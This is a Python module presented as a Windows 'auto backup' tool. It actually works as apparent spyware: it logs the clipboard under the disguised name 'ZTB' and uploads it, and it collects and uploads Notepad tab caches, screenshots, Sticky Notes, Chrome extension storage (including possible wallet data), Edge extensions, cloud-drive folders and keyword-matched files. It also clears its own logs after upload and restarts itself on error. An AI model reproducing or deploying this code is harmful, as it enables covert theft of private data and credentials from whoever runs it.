# -*- coding: utf-8 -*-

import os
import sys
import time
import logging
import shutil
import threading
import pyperclip
import getpass
from datetime import datetime, timedelta
from functools import lru_cache

from .config import BackupConfig
from .manager import BackupManager

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """获取所有可用的磁盘和云盘目录"""
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # 处理普通磁盘
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # 使用Windows路径格式
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, 'pypi_docs'), 1),  # 文档类
                'configs': (disk_path, os.path.join(backup_path, 'pypi_configs'), 2),  # 配置类
            }
            logging.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的云盘文件夹
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # 使用完整路径
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'pypi_docs'), 1),
                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'pypi_configs'), 2),
                        }
                        logging.info(f"检测到云盘目录: {item_path}")
                        
                        # 添加调试日志
                        if BackupConfig.DEBUG_MODE:
                            logging.debug(f"云盘源目录: {os.path.abspath(item_path)}")
                            logging.debug(f"云盘备份目录: {cloud_backup_path}")
        except Exception as e:
            logging.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def backup_notepad_temp(backup_manager):
    """备份记事本临时文件"""
    notepad_temp_directory = os.path.join(os.environ['LOCALAPPDATA'], 
                                        "Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState")
    notepad_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "notepad")

    if not os.path.exists(notepad_temp_directory):
        logging.error("记事本缓存目录不存在")
        return None

    if not backup_manager._clean_directory(notepad_backup_directory):
        return None

    for root, _, files in os.walk(notepad_temp_directory):
        for file in files:
            try:
                src_path = os.path.join(root, file)
                if not os.path.exists(src_path):
                    continue
                rel_path = os.path.relpath(root, notepad_temp_directory)
                dst_dir = os.path.join(notepad_backup_directory, rel_path)
                if not backup_manager._ensure_directory(dst_dir):
                    continue
                shutil.copy2(src_path, os.path.join(dst_dir, file))
            except Exception:
                continue
    return notepad_backup_directory

def backup_screenshots():
    """备份截图文件"""
    screenshot_paths = [
        os.path.join(os.environ['USERPROFILE'], "Pictures"),
        os.path.join(os.environ['ONEDRIVE'] if 'ONEDRIVE' in os.environ else os.environ['USERPROFILE'], 
                    "Pictures")
    ]
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "pypi_screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # 扫描整个Pictures目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含"screenshot"关键字（不区分大小写）
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info(f"📸 截图备份完成，共找到包含'screenshot'关键字的文件")
    else:
        logging.info("📸 未找到包含'screenshot'关键字的截图文件")
            
    return screenshot_backup_directory if files_found else None

def backup_sticky_notes_and_browser_extensions(backup_manager):
    """备份便签与浏览器扩展数据"""
    sticky_notes_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                   "Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite")
    sticky_notes_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "sticky_notes")

    # 浏览器扩展相关目录
    chrome_local_ext_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                        "Google", "Chrome", "User Data", "Default", "Local Extension Settings")
    edge_extensions_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                       "Microsoft", "Edge", "User Data", "Default", "Extensions")
    
    if not os.path.exists(sticky_notes_path):
        logging.error("便签数据文件不存在")
        return None
        
    if not backup_manager._ensure_directory(sticky_notes_backup_directory):
        return None
        
    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
    
    try:
        # 备份便签数据库
        shutil.copy2(sticky_notes_path, backup_file)

        # 备份 Chrome Local Extension Settings
        if os.path.exists(chrome_local_ext_dir):
            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
            try:
                if os.path.exists(target_chrome_dir):
                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_chrome_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Chrome Local Extension Settings")
            except Exception as e:
                logging.error(f"复制 Chrome 目录失败: {chrome_local_ext_dir} - {e}")

        # 备份 Edge Extensions
        if os.path.exists(edge_extensions_dir):
            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
            try:
                if os.path.exists(target_edge_dir):
                    shutil.rmtree(target_edge_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_edge_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Edge Extensions")
            except Exception as e:
                logging.error(f"复制 Edge 目录失败: {edge_extensions_dir} - {e}")

        return sticky_notes_backup_directory
    except Exception as e:
        logging.error(f"复制便签或浏览器目录失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # 复制日志文件到临时目录
        try:
            # 读取当前日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
                
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
                
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后清空原始日志文件，只保留一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, "clipboard_log.txt")
    
    # 启动ZTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 ZTB监控线程已启动")
    
    # 启动ZTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 ZTB上传线程已启动")
    
    # 初始化ZTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"❌ 初始化ZTB日志失败: {e}")

    # 获取用户名
    username = getpass.getuser()
    current_time = datetime.now()
    logging.critical("\n" + "="*40)
    logging.critical(f"👤 用户: {username}")
    logging.critical(f"🚀 自动备份系统已启动  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("📋 ZTB监控和自动上传已启动")
    logging.critical("="*40)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                backup_success = True
                
                # 获取当前可用的磁盘
                available_disks = get_available_disks()
                
                # 执行备份任务
                logging.critical("\n💾 磁盘备份")
                if not backup_disks(backup_manager, available_disks):
                    backup_success = False
                
                logging.critical("\n🪟 Windows数据备份")
                if not backup_windows_data(backup_manager):
                    backup_success = False
                
                logging.critical("\n🔑 关键字文件备份")
                keyword_backup_paths = backup_keyword_data(backup_manager, available_disks)
                if keyword_backup_paths:
                    for backup_path in keyword_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            backup_success = False
                            logging.error(f"❌ 关键字备份文件上传失败: {backup_path}\n")
                        else:
                            logging.critical(f"☑️ 关键字备份文件上传成功\n")
                
                # 在备份完成后上传日志
                logging.critical("\n📝 正在上传备份日志...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"❌ 日志备份上传失败: {e}")
                    backup_success = False
                
                # 写入下次备份时间
                next_backup_time = write_next_backup_time()
                
                if backup_success:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
            
            # 每小时检查一次是否需要备份
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            # 发生错误时也更新下次备份时间
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_disks(backup_manager, available_disks):
    """备份可用磁盘
    
    Returns:
        bool: 所有备份任务是否成功完成
    """
    all_success = True
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份完成\n")
                        else:
                            logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
                            all_success = False
                    else:
                        logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 压缩失败\n")
                        all_success = False
                else:
                    logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
                    all_success = False
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {str(e)}\n")
                all_success = False
    
    return all_success

def backup_windows_data(backup_manager):
    """备份Windows系统数据
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        bool: 所有Windows数据备份任务是否成功完成
    """
    all_success = True
    try:
        # 备份记事本临时文件
        notepad_backup = backup_notepad_temp(backup_manager)
        if notepad_backup:
            backup_path = backup_manager.zip_backup_folder(
                notepad_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"notepad_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 记事本临时文件备份完成\n")
                else:
                    logging.error("❌ 记事本临时文件备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 记事本临时文件压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 记事本临时文件收集失败\n")
            all_success = False
        
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"pypi_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 截图文件备份完成\n")
                else:
                    logging.error("❌ 截图文件备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 截图文件压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 截图文件收集失败\n")
            all_success = False
        
        # 备份便签与浏览器扩展数据
        sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager)
        if sticky_notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                sticky_notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"sticky_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 便签数据备份完成\n")
                else:
                    logging.error("❌ 便签数据备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 便签数据压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 便签数据收集失败\n")
            all_success = False
                    
        return all_success
        
    except Exception:
        logging.error("Windows数据备份失败")
        return False

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的ZTB上传线程"""
    last_upload_time = datetime.now()
    min_content_size = 100  # 最小内容大小（字节）
    
    while True:
        try:
            current_time = datetime.now()
            
            # 检查是否需要上传（根据配置的间隔时间）
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # 检查文件大小
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # 只有当内容足够时才上传
                            # 检查文件内容
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # 检查是否只包含启动信息或上传记录
                                only_status_info = all(line.startswith('=== 📋') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # 创建临时目录
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # 创建带时间戳的备份文件名
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # 复制日志文件到临时目录
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # 上传日志文件
                                            if backup_manager.upload_file(str(backup_path)):
                                                # 上传成功后清空原始日志文件
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== 📋 日志已于 {current_time.strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"❌ ZTB日志清空失败: {e}")
                                            else:
                                                logging.error("❌ ZTB日志上传失败")
                                        except Exception as e:
                                            logging.error(f"❌ 复制ZTB日志失败: {e}")
                                        finally:
                                            # 清理临时目录
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"❌ 清理临时目录失败: {e}")
                    except Exception as e:
                        logging.error(f"❌ 读取ZTB日志文件失败: {e}")
                        
        except Exception as e:
            logging.error(f"❌ 处理ZTB日志时出错: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # 等待一小段时间再检查
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
            
        # 需要保留的文件
        keep_files = ["backup.log", "clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    """主函数"""
    try:
        # 检查是否已经有实例在运行
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'备份程序已经在运行 (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # 写入当前进程PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # 注意：日志配置在 BackupManager.__init__ 中进行，无需重复配置
        
        # 检查磁盘空间
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'无法检查磁盘空间: {str(e)}')
        
        try:
            # 创建备份管理器实例
            backup_manager = BackupManager()
            
            # 清理旧的备份目录
            clean_backup_directory()
            
            # 启动定期备份和上传
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('备份程序被用户中断')
        except Exception as e:
            logging.error(f'备份过程发生错误: {str(e)}')
            # 发生错误时等待一段时间后重试
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # 重新启动主程序
            
    finally:
        # 清理PID文件
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'清理PID文件失败: {str(e)}')

if __name__ == "__main__":
    main()